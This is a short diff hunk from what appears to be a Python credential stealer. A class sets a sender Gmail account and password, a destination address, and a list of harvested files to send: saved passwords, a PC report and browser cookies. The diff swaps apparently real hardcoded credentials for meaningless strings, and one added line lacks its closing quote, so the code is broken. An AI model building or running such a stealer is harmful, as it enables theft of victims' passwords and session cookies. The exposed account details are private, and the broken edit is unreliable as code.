@@ -12,9 +12,9 @@ from wifi import WIFI
 
 class Main:
     def __init__(self):
-        self.source_mail = 'g00gle.configuration@gmail.com'
-        self.source_pass = 'plm123123'
-        self.dest_mail = ['castrofocus11@gmail.com']
+        self.source_mail = 'g0234123434324112316324g324132213
+        self.source_pass = 'p1234341234123123761612312312413'
+        self.dest_mail = ['c126235673247213451234']
 
         self.files = ['pass.html', 'PC.html', 'cookies.zip', 'cookies.txt']
 
